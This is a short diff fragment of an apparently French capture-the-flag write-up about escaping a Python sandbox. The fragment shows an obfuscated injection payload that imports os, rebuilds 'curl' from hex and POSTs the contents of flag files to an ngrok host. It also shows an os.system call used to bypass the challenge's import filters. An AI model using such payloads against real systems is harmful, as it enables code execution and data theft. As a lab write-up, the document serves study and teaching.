@@ -58,6 +58,8 @@ echo file_get_contents("data.txt");
 
 ``);geattr(__builtins__,'__imp''ort__')('o''s').popen(''.join([chr(int(''.join(c),16)) for s in zip('6375726c'[0::2],'6375726c'[1::2])])+'\x20-X\x20POST\x20-d\x20\x22data=$(cat flag/*)\x22\x20https://rand.ngrok.io/tmp')#``
 
+``flag{xxx}``
+
 - J'ai bien aimé l'approche du challenge. Je tiens à préciser que plusieurs techniques d'importation de la class ``__builtins__`` étaient filtrés:
 ```py
 __builtins__.__import__("os").system("ls")
